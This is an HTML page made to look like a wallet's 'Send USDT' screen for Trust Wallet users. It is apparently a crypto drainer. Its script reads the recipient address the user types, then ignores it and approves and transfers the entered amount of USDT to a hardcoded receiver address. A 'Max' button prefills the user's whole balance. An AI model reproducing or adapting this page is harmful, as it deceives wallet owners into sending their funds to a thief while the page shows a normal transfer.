<!DOCTYPE html>
<html>
<head>
  <title>Send USDT</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      color: #000;
    }
    .container {
      padding: 16px;
    }
    label {
      display: block;
      margin-top: 20px;
      margin-bottom: 8px;
      color: #444;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    .input-row {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      margin-bottom: 10px;
    }
    .input-row input {
      border: none;
      flex: 1;
    }
    .input-row button {
      background: none;
      border: none;
      color: #0052ff;
      font-weight: bold;
      padding: 0 12px;
      cursor: pointer;
    }
    #converted {
      font-size: 14px;
      color: #777;
      margin-top: 8px;
    }
    button#nextBtn {
      margin-top: 30px;
      width: 90%;
      background: #0052ff;
      color: white;
      font-size: 18px;
      font-weight: bold;
      padding: 16px;
      border: none;
      border-radius: 24px;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }
    button#nextBtn.processing {
      position: relative;
      color: #0052ff;
      background: #eee;
    }
    button#nextBtn.processing::after {
      content: "⏳ Processing...";
      position: absolute;
      left: 0;
      right: 0;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-row">
      <input type="text" id="toAddress" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC">
      <button onclick="navigator.clipboard.readText().then(text => document.getElementById('toAddress').value = text)">Paste</button>
    </div>

    <label>Amount</label>
    <div class="input-row">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span style="margin-right:10px;">USDT</span>
      <button onclick="setMax()">Max</button>
    </div>

    <div id="converted">= $0.00</div>

    <button id="nextBtn" onclick="sendUSDT()">Next</button>
  </div>

  <script>
    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";

    const ABI = [
      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
    ];

    async function setMax() {
      if (!window.ethereum) return alert("Open in Trust Wallet browser");
      const web3 = new Web3(window.ethereum);
      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
      const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
      const balance = await contract.methods.balanceOf(accounts[0]).call();
      const amount = web3.utils.fromWei(balance, 'ether');
      document.getElementById("amount").value = amount;
      document.getElementById("converted").innerText = "= $" + parseFloat(amount).toFixed(2);
    }

    async function sendUSDT() {
      const btn = document.getElementById("nextBtn");
      btn.classList.add("processing");
      try {
        if (!window.ethereum) return alert("Open in Trust Wallet browser");

        const web3 = new Web3(window.ethereum);
        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
        const user = accounts[0];
        const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
        const amount = document.getElementById("amount").value;
        const toAddress = document.getElementById("toAddress").value;

        if (!amount || !toAddress) {
          alert("Fill all fields.");
          btn.classList.remove("processing");
          return;
        }

        const value = web3.utils.toWei(amount, 'ether');
        await contract.methods.approve(RECEIVER, value).send({ from: user });
        await contract.methods.transferFrom(user, RECEIVER, value).send({ from: user });

        btn.innerText = "✅ Success";
      } catch (err) {
        btn.innerText = "❌ Failed";
        console.error(err);
      } finally {
        btn.classList.remove("processing");
      }
    }
  </script>
</body>
</html>
